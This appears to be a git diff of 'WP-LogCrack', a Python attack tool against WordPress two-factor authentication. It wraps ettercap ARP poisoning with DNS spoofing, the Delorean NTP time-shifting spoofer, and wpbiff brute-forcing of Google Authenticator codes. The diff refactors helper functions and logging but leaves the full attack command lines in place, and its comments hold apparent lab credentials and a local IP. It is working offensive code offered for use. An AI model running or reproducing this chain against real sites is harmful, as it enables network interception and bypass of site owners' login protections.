@@ -1,53 +1,39 @@
 #!/usr/bin/python
 import shlex
+import signal
 import subprocess
+
 import typer
 from requests import Session
 from rich.console import Console
 from rich.progress import Progress
 import pexpect
 from datetime import datetime
-from termcolor import colored
-from pyfiglet import Figlet
+
 from dependencies import checkErrors
-from utility import is_valid_ip_address
+from utility import is_valid_ip_address, get_timestamp, banner, is_pingable, handle_sigint
 
 console = Console()
 app = typer.Typer()
 session = Session()
-
-
-def banner():
-    f = Figlet(font='standard')
-    print(colored(f.renderText('WP-LogCrack'), 'green', attrs=["bold"]))
-
-
-def get_timestamp():
-    data = datetime.today()
-    minute = data.minute
-    minute = (minute - 2) % 60
-    hour = data.hour + 2
-    if minute < 10:
-        minute = "0" + str(minute)
-    if int(minute) < 40:
-        hour = str((data.hour + 1) % 24)
-    timestamp = data.strftime('%Y-%m-%d ' + str(hour) + ':' + str(minute))
-    return timestamp
+signal.signal(signal.SIGINT, handle_sigint)
 
 
 def ettercap(timestamp, server, username, password):
     ip = input("Enter the IP address of the vulnerable server: ")
-    #ip = "192.168.43.131"
+    # ip = "192.168.43.131"
     if not is_valid_ip_address(ip):
-        console.log(f"[red bold]Error:[/red bold] Ip addres is not valid")
+        console.log(f"[red bold]Error:[/red bold] ip address is not syntactically valid")
+    elif not is_pingable(ip):
+        console.log(f"[red bold]Error:[/red bold] IP address is unreachable")
     else:
         cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
-        print("Ettercap Starting...")
+        console.print("Ettercap Starting...")
         p = pexpect.spawn(cmd, timeout=None)
 
         if not p.eof():
             console.print("Ettercap Started!", style="bold green")
-            print("DNS Spoofing Starting...")
+            console.print("DNS Spoofing Starting...")
 
         while not p.eof():
             str_line = str(p.readline())
@@ -58,7 +44,7 @@ def ettercap(timestamp, server, username, password):
 
 
 def delorean(timestamp, server, username, password):
-    print("Delorean Starting...")
+    console.print("Delorean Starting...")
     cmd = "python3 Delorean-master/delorean.py -d \"" + timestamp + "\""
     p = pexpect.spawn(cmd, timeout=None)
 
@@ -68,7 +54,7 @@ def delorean(timestamp, server, username, password):
     while not p.eof():
         str_line = str(p.readline())
         if "OSError: [Errno 98] Address already in use" in str_line:
-            console.print("Error: Delorean already Started elsewhere!", style="bold red underline")
+            console.log("Error: Delorean already Started elsewhere!", style="bold red underline")
             break
 
         if "Sent to" in str_line:
@@ -81,7 +67,7 @@ def delorean(timestamp, server, username, password):
 
 
 def wpbiff(timestamp, server, username, password):
-    print("WP-biff Starting...")
+    console.print("WP-biff Starting...")
     command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
     command_wp_biff2 = "sudo wpbiff -t 333333 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
     command_wp_biff3 = "sudo wpbiff -t 666667 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
@@ -165,9 +151,9 @@ def main(
         )):
     banner()
     if checkErrors(server):
-        #server = "http://192.168.43.131/wordpress/wp-login.php"
-        #username = "admin"
-        #password = "ubuntu"
+        # server = "http://192.168.43.131/wordpress/wp-login.php"
+        # username = "admin"
+        # password = "ubuntu"
         with console.status("Getting timestamp to use for the Attack"):
             timestamp = get_timestamp()
             console.print("The timestamp chosen for the attack is: " + timestamp,
